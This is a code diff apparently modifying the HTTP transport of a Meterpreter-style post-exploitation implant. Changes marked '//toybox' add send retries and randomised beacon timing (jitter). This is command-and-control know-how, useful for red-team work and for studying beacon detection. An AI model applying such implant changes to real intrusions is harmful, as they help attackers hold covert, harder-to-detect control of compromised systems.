@@ -81,6 +81,7 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 						ctx->proxy_for_url = malloc(sizeof(WINHTTP_PROXY_INFO));
 						memcpy(ctx->proxy_for_url, &proxyInfo, sizeof(WINHTTP_PROXY_INFO));
 					}
+					//toybox
 					else if (ieConfig.lpszAutoConfigUrl)
 					{
 						// Handle AutoDetect + AutoConfigUrl
@@ -187,9 +188,9 @@ static HINTERNET get_request_winhttp(HttpTransportContext *ctx, BOOL isGet, cons
 			dprintf("[%s] failed to set the security flags on the request", direction);
 		}
 	}
+	//toybox
 	if (ctx->delay >= 6000)
 	{
-		//toybox
 		DWORD dwFlags = 0;
 		dwFlags = WINHTTP_DISABLE_KEEP_ALIVE;
 		WinHttpSetOption(hReq, WINHTTP_OPTION_DISABLE_FEATURE, &dwFlags, sizeof(dwFlags));
@@ -345,17 +346,21 @@ static DWORD packet_transmit_http(Remote *remote, LPBYTE rawPacket, DWORD rawPac
 		{
 			break;
 		}
-
-		result = ctx->send_req(ctx, hReq, rawPacket, rawPacketLength);
-
-		if (!result)
+		//toybox
+		while (retries > 0)
 		{
-			dprintf("[PACKET TRANSMIT] Failed HttpSendRequest: %d", GetLastError());
-			SetLastError(ERROR_NOT_FOUND);
+			retries--;
+			result = ctx->send_req(ctx, hReq, rawPacket, rawPacketLength);
+
+			if (!result)
+			{
+				dprintf("[PACKET TRANSMIT] Failed HttpSendRequest: %d", GetLastError());
+				SetLastError(ERROR_NOT_FOUND);
+				continue;
+			}
+			dprintf("[PACKET TRANSMIT] request sent.. apparently");
 			break;
 		}
-
-		dprintf("[PACKET TRANSMIT] request sent.. apparently");
 	} while(0);
 
 	ctx->close_req(hReq);
@@ -719,6 +724,7 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 
 		dprintf("[DISPATCH] Reading data from the remote side...");
 		result = packet_receive_http(remote, &packet);
+		//toybox
 		ctx->delay = 0;
 		if (result != ERROR_SUCCESS)
 		{
@@ -765,8 +771,8 @@ static DWORD server_dispatch_http(Remote* remote, THREAD* dispatchThread)
 			{
 				delay *= 10;
 			}
+			//toybox
 			ecount = ecount + rand() % 5 ;
-			//ecount++;
 			DWORD max_delay = 10000 - rand() % 3000;
 			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
 			ctx->delay = min(max_delay, delay);
